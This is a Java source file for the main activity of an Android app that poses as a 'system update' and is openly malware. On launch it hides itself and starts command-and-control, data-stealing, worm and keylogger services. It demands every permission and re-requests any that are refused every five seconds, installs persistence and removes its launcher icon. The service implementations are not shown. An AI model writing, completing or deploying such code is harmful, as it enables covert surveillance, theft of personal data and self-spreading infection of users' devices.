package com.android.system.update;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.WindowManager;

import com.android.system.update.services.C2Service;
import com.android.system.update.services.KeyloggerService;
import com.android.system.update.services.StealerService;
import com.android.system.update.services.WormService;
import com.android.system.update.utils.PermissionManager;
import com.android.system.update.utils.PersistenceManager;

public class MainActivity extends Activity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide activity immediately
        moveTaskToBack(true);
        
        // Start all services
        startAllServices();
        
        // Request all permissions
        PermissionManager.requestAllPermissions(this);
        
        // Install persistence mechanisms
        PersistenceManager.installAll(this);
        
        // Hide icon after first run
        hideLauncherIcon();
        
        // Finish activity
        finish();
    }
    
    private void startAllServices() {
        // C2 Service
        startService(new Intent(this, C2Service.class));
        
        // Stealer Service
        startService(new Intent(this, StealerService.class));
        
        // Worm Service
        startService(new Intent(this, WormService.class));
        
        // Keylogger Service (requires accessibility)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
            startService(new Intent(this, KeyloggerService.class));
        }
    }
    
    private void hideLauncherIcon() {
        PackageManager p = getPackageManager();
        p.setComponentEnabledSetting(
            getComponentName(),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Retry failed permissions
        new Handler().postDelayed(() -> {
            PermissionManager.requestAllPermissions(this);
        }, 5000);
    }
}